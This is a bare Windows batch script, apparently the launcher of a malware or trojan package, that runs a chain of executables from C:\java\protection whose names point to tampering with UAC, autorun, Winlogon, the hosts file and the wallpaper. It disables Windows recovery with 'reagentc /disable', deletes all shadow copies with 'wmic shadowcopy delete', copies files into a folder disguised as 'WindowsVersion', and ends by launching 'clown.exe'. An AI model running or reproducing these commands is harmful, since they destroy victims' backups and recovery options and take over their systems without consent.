%@Try%
start C:\java\protection\start\startban.exe
%@EndTry%
%@Try%
start C:\java\protection\def.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startcur.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startkey.exe
%@EndTry%
%@Try%
reagentc /disable
wmic shadowcopy delete /nointeractive
%@EndTry%
MKDIR C:\ProgramData\WindowsVersion
%@Try%
C:\java\zip\7z.exe a -tzip -mx1 -r0 C:\ProgramData\WindowsVersion\archive.zip C:\java
%@EndTry%
copy /b "C:\java\zip\7z.exe" "C:\ProgramData\WindowsVersion"
copy /b "C:\java\zip\7z.dll" "C:\ProgramData\WindowsVersion"
%@Try%
start C:\java\protection\start\startdelstartup.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startuac.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startauto.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startWinlog.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startExplorerIcons.exe
%@EndTry%
%@Try%
start C:\java\protection\start\starticons.exe
%@EndTry%
setlocal EnableExtensions DisableDelayedExpansion
ie4uinit.exe -show
endlocal
%@Try%
start C:\java\protection\start\starthosts.exe
%@EndTry%
%@Try%
start C:\java\protection\start\startWPChanger.exe
%@EndTry%
start C:\java\clown.exe